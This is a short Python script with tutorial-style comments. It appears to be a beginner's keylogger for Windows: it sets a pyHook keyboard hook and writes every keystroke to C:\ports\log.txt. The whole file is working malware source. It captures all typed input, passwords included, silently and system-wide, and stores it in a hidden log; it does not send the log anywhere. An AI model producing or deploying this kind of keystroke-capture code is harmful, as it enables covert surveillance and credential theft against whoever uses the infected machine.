# Modules needed to create this script
import pyHook, pythoncom, sys, logging



# variable that tell us where to save the logging data and double slash in the path for python to understand it
file_log = 'C:\\ports\\log.txt' 

#function that monitors keyboard events
def OnkeyboardEvent(event):
    # logging module to set our file name, debugging level and logging format
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s') 
    chr(event.Ascii)
    # log each character as its corresponding ASSCI format
    logging.log(10,chr(event.Ascii))
    # returns true at the end of the function and watches for the next event
    return True 

hooks_manager = pyHook.HookManager()  #setup pyhook manager that allows us to set a hook on windows events
hooks_manager.KeyDown = OnkeyboardEvent  #keydown variable to watch for key presses
hooks_manager.HookKeyboard()
pythoncom.PumpMessages() # pythoncom capture key messages
    
 
